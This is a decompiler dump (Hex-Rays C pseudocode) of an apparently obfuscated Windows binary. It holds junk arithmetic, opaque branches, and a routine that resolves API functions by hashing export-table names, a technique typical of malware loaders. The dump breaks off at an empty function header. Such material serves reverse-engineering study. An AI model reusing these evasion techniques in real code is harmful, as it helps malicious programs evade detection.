/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// int __usercall sub_40123B@<eax>(int a1@<eax>);
// void __usercall sub_40162A(char a1@<al>, int a2@<ebx>, int a3@<edi>);
// int __usercall sub_40168A@<eax>(int a1@<eax>);
// int __usercall sub_4016B5@<eax>(int a1@<eax>, int a2@<ebp>);
// int __usercall sub_401BCA@<eax>(int a1@<eax>);
// int __usercall sub_401D1E@<eax>(int a1@<eax>);
// void __usercall sub_4021BE(char a1@<cl>, int a2@<ebx>);
// int __usercall sub_402267@<eax>(int a1@<eax>, int a2@<ebp>);
// int __usercall sub_402BF2@<eax>(int a1@<eax>);
// int __usercall sub_402E84@<eax>(int a1@<eax>);
// int __usercall sub_40315D@<eax>(int a1@<eax>);
void sub_4032C4();
// int __usercall sub_403A6A@<eax>(int a1@<eax>);
// int __usercall sub_403F1C@<eax>(int a1@<eax>);
// void __usercall sub_40417D(int a1@<eax>);
void sub_40448E();
// int __usercall sub_404726@<eax>(int a1@<eax>);
// int __usercall sub_404911@<eax>(int a1@<eax>);
// int __usercall sub_404968@<eax>(int a1@<eax>);
// int __usercall sub_404B85@<eax>(int a1@<eax>, int a2@<ebp>);
// int __usercall sub_404DC1@<eax>(int a1@<eax>, int a2@<ebp>);
// void __usercall sub_4050FB(int a1@<eax>);
// int __usercall sub_405209@<eax>(int a1@<eax>);
void __fastcall sub_405422(unsigned __int16 a1, int a2);
// __int64 __usercall sub_405547@<edx:eax>(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>);
// int __usercall sub_405794@<eax>(char a1@<cl>, int a2@<ebx>, int a3);
// int __usercall sub_4057D7@<eax>(int a1@<eax>);
// int __usercall sub_405864@<eax>(int a1@<eax>);
// void __usercall sub_405963(int a1@<eax>, int a2@<ebp>);
// int (__fastcall *__usercall sub_405A5B@<eax>(int a1@<edx>, int a2@<ebx>))(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// int __usercall sub_405A77@<eax>(int a1@<eax>);
// int __usercall sub_405C6C@<eax>(int a1@<eax>);
// int __usercall sub_405D2D@<eax>(int a1@<eax>);
// int __usercall sub_405D8A@<eax>(int a1@<eax>);
// int __usercall sub_406106@<eax>(int a1@<eax>, int a2@<ebp>);
// unsigned int __usercall sub_40627A@<eax>(int a1@<edx>, char a2@<bh>, int a3@<esi>);
int sub_4068EE();
unsigned int __cdecl sub_406A8D(_BYTE *a1);
// int __usercall sub_406E72@<eax>(int a1@<ebx>);
// int __usercall sub_406F1A@<eax>(int a1@<eax>, int a2@<ebp>);
int sub_4072E5();
// int __usercall sub_407346@<eax>(int a1@<eax>, int a2@<ebp>);
// int __usercall sub_407351@<eax>(int a1@<eax>);
// int __usercall sub_40748C@<eax>(int a1@<eax>);
// int __usercall sub_407540@<eax>(int a1@<eax>, int a2@<ebp>);
// int __usercall sub_407941@<eax>(int a1@<eax>);
// void __usercall start(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<ebp>, int a5@<edi>, int a6@<esi>);
void __cdecl sub_40862F(char *a1, char *a2);
void __cdecl sub_408DDB(int a1, int a2, _BYTE *a3);
void __cdecl sub_408DF2(int a1, int a2, int a3);
void __noreturn sub_40F5B8(); // weak
// void __usercall __noreturn sub_410884(char a1@<al>, int a2@<ebx>);
// void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_42362A; // weak
_UNKNOWN unk_42372A; // weak
int dword_43D004 = 0; // weak
int dword_43D008 = 0; // weak
int dword_43D00C = 0; // weak
int dword_43D010 = 0; // weak
int dword_43D014 = 0; // weak
int dword_43D018 = 0; // weak
int dword_43D01C = 0; // weak
int dword_43D020 = 0; // weak
int dword_43D024 = 0; // weak
int dword_43D028 = 0; // weak
int dword_43D02C = 0; // weak
int dword_43D030 = 0; // weak
int dword_43D034 = 0; // weak
int dword_43D038 = 0; // weak
int dword_43D03C = 0; // weak
int dword_43D040 = 0; // weak
int dword_43D044 = 0; // weak
int dword_43D048 = 0; // weak
int dword_43D04C = 0; // weak
char byte_43D378 = '\\'; // weak
char byte_43D488 = '\0'; // weak
int dword_43D4CC = 516325684; // weak
int dword_43D608 = 59894265; // weak
char byte_43D61C = '\xFF'; // weak
int dword_43D63C = 22251880; // weak
_UNKNOWN byte_43D6B0; // weak
char byte_43D6F4 = '\0'; // weak
int dword_43D7C4 = -2147466265; // weak
int dword_43D840 = 1413319424; // weak
char byte_43D848 = 'n'; // weak
int dword_43D868 = 50331650; // weak
char byte_43D874 = 'Ð'; // weak
void *off_43D900 = &unk_43D6B8; // weak
char byte_43D928 = 'ø'; // weak
int dword_43D988 = 1300885761; // weak
int dword_43DA38 = -373280512; // weak
int dword_43DAE4 = 1138426909; // weak
int dword_43DB50 = -1820; // weak
char byte_43DBB8 = '\0'; // weak
char byte_43DCC0 = '‰'; // weak
int dword_43DCF8 = 1505555329; // weak
int dword_43DD5C = 490405955; // weak
char byte_43DE04 = 'C'; // weak
int dword_43DE84 = 552723073; // weak
void *off_43DED4 = &unk_43DB2C; // weak
int dword_43DF6C = -179735; // weak
char byte_43E05C = 'Q'; // weak
int dword_43E078 = 352321543; // weak
int dword_43E0B8 = 1137891389; // weak
int dword_43E0BC = -952243456; // weak
int dword_43E1C4 = -2097152000; // weak
int dword_43E1D0 = -402653119; // weak
_UNKNOWN dword_43E200; // weak
char byte_43E2DC = '\0'; // weak
int dword_43E314 = -804256313; // weak
int *off_43E410 = &dword_43D00C; // weak
int dword_43E484 = -1162007; // weak
int dword_43E49C = 1195900927; // weak
int dword_43E565 = 88675123; // weak
_DWORD dword_43E569 = 0; // idb
void *jpt_406D21[5] = { &loc_4027B4, &loc_4035EC, &def_406D21, &loc_405851, &loc_40647C }; // weak
int dword_43E585 = 0; // weak
int dword_43E5A5 = 0; // weak
int (__fastcall *dword_43E5C5)(_DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_43E5C9; // weak
_UNKNOWN unk_43E5CD; // weak
int dword_43E5DC = 0; // weak
char byte_43E600 = '\0'; // weak
int dword_43E688 = 0; // weak
char byte_43E6A0 = '\0'; // weak
int (__thiscall *dword_43E6CC)(_DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_43E6F4; // weak
_DWORD dword_43E6F6 = 272727; // idb
int (__fastcall *dword_43E6FA)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_43E702)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_43E706 = 212571; // weak
int dword_43E70A = 362436069; // weak
int (__fastcall *dword_43E70E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_43E712 = 0; // weak
int dword_43E734 = 0; // weak
int dword_43E73A = 521288629; // weak
int dword_43E73E = 0; // weak
int dword_43E742 = 1316123355; // weak
int (__fastcall *dword_43E74A)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_43E752)(_DWORD, _DWORD) = NULL; // weak
int dword_43E762 = 0; // weak
int (__fastcall *dword_43E766)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_43E78D)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_DWORD dword_43E795[4] = { 0, 0, 0, 0 }; // idb
int dword_43E80C; // weak
int dword_43E89C; // weak
int dword_43EA18; // weak
int dword_43EA4C; // weak
char byte_43EA7C; // weak
int dword_43EA80; // weak


//----- (0040123B) --------------------------------------------------------
int __usercall sub_40123B@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 168 < 0 )
    result = 403;
  else
    result = 110;
  return result;
}
// 402506: conditional instruction was optimized away because of 'ebx.4==68'
// 40250D: conditional instruction was optimized away because of 'ebx.4==68'
// 406262: conditional instruction was optimized away because of '%var_14.4==91'
// 406268: conditional instruction was optimized away because of '%var_14.4==91'
// 40626F: conditional instruction was optimized away because of '%var_14.4==91'

//----- (0040162A) --------------------------------------------------------
void __usercall sub_40162A(char a1@<al>, int a2@<ebx>, int a3@<edi>)
{
  int (__fastcall *v3)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int (__thiscall *v4)(_DWORD, _DWORD, _DWORD); // eax
  int v5; // ebx
  int v6; // esi
  int (__thiscall *v7)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v8; // edx
  int v9; // ebx
  int v10; // esi
  int v11; // edi
  int (__fastcall *v12)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int (__fastcall *v13)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v14; // ecx
  int v15; // ebx
  int (__fastcall *v16)(_DWORD, _DWORD); // eax
  int v17; // edx
  int v18; // ebx
  bool v19; // cf
  int (__thiscall *v20)(_DWORD, _DWORD); // eax
  int v21; // ecx
  FARPROC (__stdcall **v22)(HMODULE, LPCSTR); // ebx
  int v23; // ebx
  char v24; // [esp-8h] [ebp-8h]
  int v25; // [esp-8h] [ebp-8h]
  int v26; // [esp-8h] [ebp-8h]
  char v27; // [esp-4h] [ebp-4h]
  int v28; // [esp-4h] [ebp-4h]
  char v29; // [esp-4h] [ebp-4h]

  dword_43D04C += a3;
  dword_43D020 -= a3;
  v3 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405794(a1, a2, 262468866);
  if ( v3 )
  {
    dword_43E6FA = v3;
    v5 = dword_43DCF8;
    v4 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD))sub_405794(v27 & 0xB7, dword_43DCF8, 1493072574);
    BYTE1(v5) = byte_43DE04;
    dword_43D038 = v5;
    if ( v4 )
    {
      v23 = v5 | 0x1E45;
      LOBYTE(dword_43D034) = -24;
      dword_43E6CC = v4;
      dword_43D004 -= *(int *)((char *)jpt_406D21 + 3);
      v13 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405794(SHIBYTE(jpt_406D21[0]), v23, 150532372);
      v15 = dword_43EA80 + v23;
      dword_43D034 = v15;
      if ( v13 )
      {
        dword_43E74A = v13;
        dword_43D040 = v14 - 7923;
        v16 = (int (__fastcall *)(_DWORD, _DWORD))sub_405794(v24 ^ 0xF4, v15, 1916711125);
        LOBYTE(dword_43D01C) = dword_43D01C + 85;
        dword_43D03C = v15;
        dword_43D030 += v17;
        v18 = dword_43EA18 + v15;
        if ( v16 )
        {
          dword_43E5C5 = v16;
          v19 = __CFADD__(byte_43E6A0, BYTE1(v18));
          BYTE1(v18) += byte_43E6A0;
          dword_43D018 = v25;
          v20 = (int (__thiscall *)(_DWORD, _DWORD))sub_405794(v25, v19 + v18 + 27967, -2114916129);
          v21 = v26 ^ 0x5949;
          v22 = &GetProcAddress;
          if ( v20 )
          {
            dword_43E752 = v20;
            v6 = v21 + 4658;
            LOBYTE(v22) = (unsigned __int8)&GetProcAddress - byte_43DCC0;
            v7 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405794(
                                                                                               v21
                                                                                             - (((unsigned __int8)&GetProcAddress < (unsigned __int8)byte_43DCC0)
                                                                                              - 49),
                                                                                               (int)v22,
                                                                                               v28);
            LOBYTE(dword_43D028) = dword_43D028 + 112;
            dword_43D01C += v8;
            dword_43D00C = ((unsigned int)&DeleteCriticalSection >> 4) & 0x3881;
            v9 = dword_43E89C;
            if ( v7 )
            {
              dword_43E702 = v7;
              v10 = v6 | 0x4606;
              v11 = dword_43E1D0;
              v12 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405794(v29, dword_43E89C, 255840707);
              dword_43D008 = 30710;
              dword_43D044 = v9;
              if ( v12 )
              {
                dword_43E766 = v12;
                dword_43D048 = v10;
                sub_405A5B(v11 ^ 0x6031, (v10 ^ v9) + 3574);
                dword_43D02C = 20646;
                __asm { retn }
              }
            }
          }
        }
      }
    }
  }
  JUMPOUT(0x401E41);
}
// 406932: control flows out of bounds to 401E41
// 404107: variable 'v27' is possibly undefined
// 4063B4: variable 'v28' is possibly undefined
// 4063C0: variable 'v8' is possibly undefined
// 4063F5: variable 'v29' is possibly undefined
// 4073CB: variable 'v14' is possibly undefined
// 4073C5: variable 'v24' is possibly undefined
// 4073EC: variable 'v17' is possibly undefined
// 4076CB: variable 'v25' is possibly undefined
// 4076E3: variable 'v26' is possibly undefined
// 43D004: using guessed type int dword_43D004;
// 43D008: using guessed type int dword_43D008;
// 43D00C: using guessed type int dword_43D00C;
// 43D018: using guessed type int dword_43D018;
// 43D01C: using guessed type int dword_43D01C;
// 43D020: using guessed type int dword_43D020;
// 43D028: using guessed type int dword_43D028;
// 43D02C: using guessed type int dword_43D02C;
// 43D030: using guessed type int dword_43D030;
// 43D034: using guessed type int dword_43D034;
// 43D038: using guessed type int dword_43D038;
// 43D03C: using guessed type int dword_43D03C;
// 43D040: using guessed type int dword_43D040;
// 43D044: using guessed type int dword_43D044;
// 43D048: using guessed type int dword_43D048;
// 43D04C: using guessed type int dword_43D04C;
// 43DCC0: using guessed type char byte_43DCC0;
// 43DCF8: using guessed type int dword_43DCF8;
// 43DE04: using guessed type char byte_43DE04;
// 43E1D0: using guessed type int dword_43E1D0;
// 43E56D: using guessed type void *jpt_406D21[5];
// 43E591: using guessed type void *jpt_4056AE[5];
// 43E5C5: using guessed type int (__fastcall *dword_43E5C5)(_DWORD, _DWORD);
// 43E6A0: using guessed type char byte_43E6A0;
// 43E6CC: using guessed type int (__thiscall *dword_43E6CC)(_DWORD, _DWORD, _DWORD);
// 43E6FA: using guessed type int (__fastcall *dword_43E6FA)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E702: using guessed type int (__thiscall *dword_43E702)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E712: using guessed type int dword_43E712;
// 43E73E: using guessed type int dword_43E73E;
// 43E74A: using guessed type int (__fastcall *dword_43E74A)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E752: using guessed type int (__thiscall *dword_43E752)(_DWORD, _DWORD);
// 43E766: using guessed type int (__fastcall *dword_43E766)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E89C: using guessed type int dword_43E89C;
// 43EA18: using guessed type int dword_43EA18;
// 43EA80: using guessed type int dword_43EA80;

//----- (0040168A) --------------------------------------------------------
int __usercall sub_40168A@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  return sub_406F1A(a1, (int)&savedregs);
}

//----- (004016B5) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_4016B5@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v3; // eax
  int v4; // et2

  *(_DWORD *)(a2 - 16) = 146;
  *(_DWORD *)(a2 - 4) = 29;
  *(_DWORD *)(a2 - 32) = 216;
  *(_DWORD *)(a2 - 28) = 125;
  *(_DWORD *)(a2 - 44) = 125;
  *(_DWORD *)(a2 - 40) = 253;
  *(_DWORD *)(a2 - 12) = 247;
  *(_DWORD *)(a2 - 20) = 137;
  *(_DWORD *)(a2 - 24) = 42;
  v4 = a1 % 145;
  v3 = a1 / 145;
  *(_DWORD *)(a2 - 8) = v4;
  if ( v4 >= 32 )
    return 108;
  sub_402BF2(v3);
  return 255;
}
// 402B0C: positive sp value 4 has been found

//----- (00401BCA) --------------------------------------------------------
int __usercall sub_401BCA@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 104 < 7 )
    result = 182;
  else
    result = 37;
  return result;
}
// 404BD4: conditional instruction was optimized away because of '%var_20.4==2F'
// 404BDA: conditional instruction was optimized away because of '%var_20.4==2F'

//----- (00401D1E) --------------------------------------------------------
int __usercall sub_401D1E@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 159 < 37 )
    result = 184;
  else
    result = 14;
  return result;
}
// 40341B: conditional instruction was optimized away because of '%var_10.4==C0'
// 403421: conditional instruction was optimized away because of '%var_10.4==C0'

//----- (004021BE) --------------------------------------------------------
void __usercall sub_4021BE(char a1@<cl>, int a2@<ebx>)
{
  dword_43D040 += 17691;
  LOBYTE(dword_43D010) = -53;
  dword_43D024 = a2;
  LOBYTE(dword_43D03C) = dword_43D03C - 104;
  LOBYTE(a2) = a1;
  BYTE1(a2) += byte_43E2DC;
  dword_43D02C += 12645;
  dword_43D030 = a2;
  JUMPOUT(0x406A95);
}
// 405B37: control flows out of bounds to 406A95
// 43D010: using guessed type int dword_43D010;
// 43D024: using guessed type int dword_43D024;
// 43D02C: using guessed type int dword_43D02C;
// 43D030: using guessed type int dword_43D030;
// 43D03C: using guessed type int dword_43D03C;
// 43D040: using guessed type int dword_43D040;
// 43E2DC: using guessed type char byte_43E2DC;

//----- (00402267) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_402267@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v2; // eax
  bool v3; // cf
  int v4; // eax
  int v6; // eax
  int v7; // edx
  int v8; // et2

  *(_DWORD *)(a2 - 16) = 172;
  *(_DWORD *)(a2 - 28) = 103;
  *(_DWORD *)(a2 - 32) = 252;
  *(_DWORD *)(a2 - 36) = 249;
  *(_DWORD *)(a2 - 24) = 99;
  *(_DWORD *)(a2 - 12) = 42;
  *(_DWORD *)(a2 - 20) = 129;
  *(_DWORD *)(a2 - 8) = 50;
  *(_DWORD *)(a2 - 4) = 50;
  v8 = a1 % 100;
  v6 = a1 / 100;
  v7 = v8;
  *(_DWORD *)(a2 - 40) = v7;
  if ( v7 >= 22 )
    return 159;
  sub_403A6A(v6);
  v2 = *(_DWORD *)(a2 - 16);
  v3 = v2 == 0;
  v4 = v2 - 1;
  if ( !v3 && v4 && v4 == 1 )
    *(_DWORD *)(a2 - 20) = *(_DWORD *)(a2 - 28);
  return 790;
}
// 4064A7: positive sp value 4 has been found

//----- (00402BF2) --------------------------------------------------------
int __usercall sub_402BF2@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 167;
  v1 = a1 / 167;
  if ( v2 < 13 )
  {
    sub_407351(v1);
    JUMPOUT(0x406C98);
  }
  return 111;
}
// 406C93: control flows out of bounds to 406C98
// 40284A: conditional instruction was optimized away because of '%var_14.4==F3'
// 402BBE: conditional instruction was optimized away because of '%var_10.4==C6'
// 407A4B: conditional instruction was optimized away because of '%var_C.4==60'

//----- (00402E84) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_402E84@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_4016B5(a1, (int)&savedregs);
}
// 402E87: bad sp value at call

//----- (0040315D) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_40315D@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_407540(a1, (int)&savedregs);
}
// 403160: bad sp value at call

//----- (004032C4) --------------------------------------------------------
void sub_4032C4()
{
  JUMPOUT(0x406AC4);
}
// 404340: control flows out of bounds to 406AC4

//----- (00403A6A) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_403A6A@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_404B85(a1, (int)&savedregs);
}
// 403A6D: bad sp value at call

//----- (00403F1C) --------------------------------------------------------
int __usercall sub_403F1C@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // eax
  int v4; // et2

  v4 = a1 % 17;
  v3 = a1 / 17;
  if ( v4 >= 28 )
    return 184;
  v2 = sub_405C6C(v3);
  sub_40168A(v2);
  return 260;
}
// 4045E1: conditional instruction was optimized away because of '%var_14.4==28'

//----- (0040417D) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __usercall sub_40417D(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  sub_405963(a1, (int)&savedregs);
}
// 404180: bad sp value at call

//----- (0040448E) --------------------------------------------------------
void sub_40448E()
{
  JUMPOUT(0x4020C0);
}
// 4066A1: control flows out of bounds to 4020C0

//----- (00404726) --------------------------------------------------------
int __usercall sub_404726@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  return sub_402267(a1, (int)&savedregs);
}

//----- (00404911) --------------------------------------------------------
int __usercall sub_404911@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  return sub_406106(a1, (int)&savedregs);
}

//----- (00404968) --------------------------------------------------------
int __usercall sub_404968@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 19 < 0 )
    result = 336;
  else
    result = 69;
  return result;
}
// 4038E7: conditional instruction was optimized away because of '%var_54.4==1E'
// 406471: conditional instruction was optimized away because of '%var_C.4==79'

//----- (00404B85) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_404B85@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v2; // eax
  int v3; // eax
  int v4; // ecx
  bool v5; // cf
  int v6; // ecx
  int v8; // ecx
  int v9; // ecx
  int v10; // eax
  int v11; // et2

  *(_DWORD *)(a2 - 8) = 162;
  *(_DWORD *)(a2 - 24) = 66;
  *(_DWORD *)(a2 - 20) = 66;
  *(_DWORD *)(a2 - 48) = 131;
  *(_DWORD *)(a2 - 32) = 240;
  *(_DWORD *)(a2 - 36) = 169;
  *(_DWORD *)(a2 - 12) = 158;
  *(_DWORD *)(a2 - 44) = 158;
  *(_DWORD *)(a2 - 28) = 205;
  *(_DWORD *)(a2 - 4) = 253;
  *(_DWORD *)(a2 - 16) = 131;
  v11 = a1 % 169;
  v2 = a1 / 169;
  *(_DWORD *)(a2 - 40) = v11;
  if ( v11 >= 25 )
    return 77;
  v8 = *(_DWORD *)(a2 - 16);
  v5 = v8 == 0;
  v9 = v8 - 1;
  if ( v5 )
  {
    v2 = sub_404911(v2);
  }
  else if ( !v9 )
  {
    v2 = *(_DWORD *)(a2 - 44);
  }
  if ( *(_DWORD *)(a2 - 40) == *(_DWORD *)(a2 - 48) )
  {
    v4 = *(_DWORD *)(a2 - 32);
    v5 = v4 == 0;
    v6 = v4 - 1;
    if ( v5 )
    {
      v10 = *(_DWORD *)(a2 - 36);
      *(_DWORD *)(a2 - 4) += v10;
      v2 = sub_405209(v10);
    }
    else if ( !v6 )
    {
      v2 = sub_407941(v2);
    }
  }
  v3 = sub_407941(v2);
  if ( !*(_DWORD *)(a2 - 28) )
    v3 = *(_DWORD *)(a2 - 20) != *(_DWORD *)(a2 - 16);
  sub_402E84(v3);
  return 708;
}
// 403B11: positive sp value 4 has been found

//----- (00404DC1) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_404DC1@<eax>(int a1@<eax>, int a2@<ebp>)
{
  *(_DWORD *)(a2 - 12) = 151;
  *(_DWORD *)(a2 - 24) = 100;
  *(_DWORD *)(a2 - 16) = 91;
  *(_DWORD *)(a2 - 28) = 91;
  *(_DWORD *)(a2 - 8) = 208;
  *(_DWORD *)(a2 - 20) = 68;
  *(_DWORD *)(a2 - 4) = a1 % 91;
  if ( a1 % 91 >= 0 )
    return 174;
  if ( *(_DWORD *)(a2 - 24) != *(_DWORD *)(a2 - 28) )
    sub_405C6C(*(_DWORD *)(a2 - 12));
  return 476;
}
// 401995: positive sp value 4 has been found

//----- (004050FB) --------------------------------------------------------
void __usercall sub_4050FB(int a1@<eax>)
{
  if ( a1 % 200 >= 26 )
    JUMPOUT(0x401695);
  if ( a1 % 200 > 189 )
    JUMPOUT(0x406B6E);
  JUMPOUT(0x4065F3);
}
// 4027FB: control flows out of bounds to 406B6E
// 402AB8: control flows out of bounds to 401695
// 4078CE: control flows out of bounds to 4065F3
// 4078C8: control flows out of bounds to 402723
// 4078C2: conditional instruction was optimized away because of '%var_C.4==75'
// 4078C8: conditional instruction was optimized away because of '%var_C.4==75'

//----- (00405209) --------------------------------------------------------
int __usercall sub_405209@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 20;
  v1 = a1 / 20;
  if ( v2 >= 3 )
    return 153;
  sub_407941(v1);
  return 221;
}
// 405D9C: conditional instruction was optimized away because of '%var_4.4==65'
// 405DA2: conditional instruction was optimized away because of '%var_4.4==65'
// 407513: conditional instruction was optimized away because of '%var_10.4==65'

//----- (00405422) --------------------------------------------------------
void __fastcall sub_405422(unsigned __int16 a1, int a2)
{
  int v2; // ebx

  dword_43D048 = 21757;
  HIWORD(v2) = HIWORD(a2);
  LOBYTE(v2) = 0x80;
  BYTE1(v2) = byte_43D61C + BYTE1(a2);
  dword_43D02C -= __CFADD__((a1 - dword_43D7C4) | 0x11C6, 386) + v2 + 31752;
  dword_43E706 = dword_43E70A;
  JUMPOUT(0x406AE9);
}
// 401E34: control flows out of bounds to 406AE9
// 43D02C: using guessed type int dword_43D02C;
// 43D048: using guessed type int dword_43D048;
// 43D61C: using guessed type char byte_43D61C;
// 43D7C4: using guessed type int dword_43D7C4;
// 43E706: using guessed type int dword_43E706;
// 43E70A: using guessed type int dword_43E70A;

//----- (00405547) --------------------------------------------------------
__int64 __usercall sub_405547@<edx:eax>(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  __int64 result; // rax

  BYTE5(result) = -69;
  qmemcpy(a2, a3, a1);
  dword_43D010 = 8819;
  return result;
}
// 43D010: using guessed type int dword_43D010;

//----- (00405794) --------------------------------------------------------
int __usercall sub_405794@<eax>(char a1@<cl>, int a2@<ebx>, int a3)
{
  int v3; // eax
  unsigned int i; // esi
  int v5; // eax
  int v6; // ebx
  _DWORD *v8; // edi
  unsigned __int16 *v9; // [esp+18h] [ebp-Ch]
  _DWORD *v10; // [esp+1Ch] [ebp-8h]
  int v11; // [esp+20h] [ebp-4h]

  sub_4021BE(a1, a2);
  v6 = v5;
  v3 = v5 + *(_DWORD *)(v5 + 60) + 24;
  v8 = (_DWORD *)(v6 + *(_DWORD *)(v3 + 96));
  if ( HIWORD(a3) )
  {
    v10 = (_DWORD *)(v6 + v8[8]);
    v9 = (unsigned __int16 *)(v6 + v8[9]);
    for ( i = 0; v8[6] > i; ++i )
    {
      if ( sub_406A8D((_BYTE *)(v6 + *v10)) == a3 )
      {
        v11 = *v9;
        break;
      }
      ++v10;
      ++v9;
    }
    if ( v8[6] == i )
      return 0;
  }
  else
  {
    v11 = (unsigned __int16)a3 - v8[4];
  }
  return v6 + *(_DWORD *)(v6 + v8[7] + 4 * v11);
}
// 40487A: variable 'v5' is possibly undefined
// 407553: variable 'v11' is possibly undefined

//----- (004057D7) --------------------------------------------------------
int __usercall sub_4057D7@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 83 < 29 )
    result = 6;
  else
    result = 198;
  return result;
}
// 401106: conditional instruction was optimized away because of '%var_2C.4==68'
// 4013A6: conditional instruction was optimized away because of '%var_8.4==FC'
// 4013B2: conditional instruction was optimized away because of '%var_28.4==E9'
// 4013B8: conditional instruction was optimized away because of '%var_28.4==E9'
// 40388B: conditional instruction was optimized away because of '%var_4.4==5D'
// 4047DF: conditional instruction was optimized away because of '%var_1C.4==5A'
// 4053B1: conditional instruction was optimized away because of '%var_2C.4==68'

//----- (00405864) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_405864@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_407346(a1, (int)&savedregs);
}
// 405867: bad sp value at call

//----- (00405963) --------------------------------------------------------
void __usercall sub_405963(int a1@<eax>, int a2@<ebp>)
{
  *(_DWORD *)(a2 - 44) = 117;
  *(_DWORD *)(a2 - 40) = 2;
  *(_DWORD *)(a2 - 28) = 5;
  *(_DWORD *)(a2 - 12) = 2;
  *(_DWORD *)(a2 - 8) = 103;
  *(_DWORD *)(a2 - 52) = 27;
  *(_DWORD *)(a2 - 24) = 27;
  *(_DWORD *)(a2 - 20) = 117;
  *(_DWORD *)(a2 - 36) = 103;
  *(_DWORD *)(a2 - 16) = 30;
  *(_DWORD *)(a2 - 48) = 245;
  *(_DWORD *)(a2 - 32) = 76;
  *(_DWORD *)(a2 - 4) = a1 % 103;
  if ( a1 % 103 >= 24 )
    JUMPOUT(0x4043BA);
  JUMPOUT(0x402F4A);
}
// 402891: control flows out of bounds to 402F4A
// 4042C7: control flows out of bounds to 4043BA
// 402885: control flows out of bounds to 406E54
// 40288B: control flows out of bounds to 40661B

//----- (00405A5B) --------------------------------------------------------
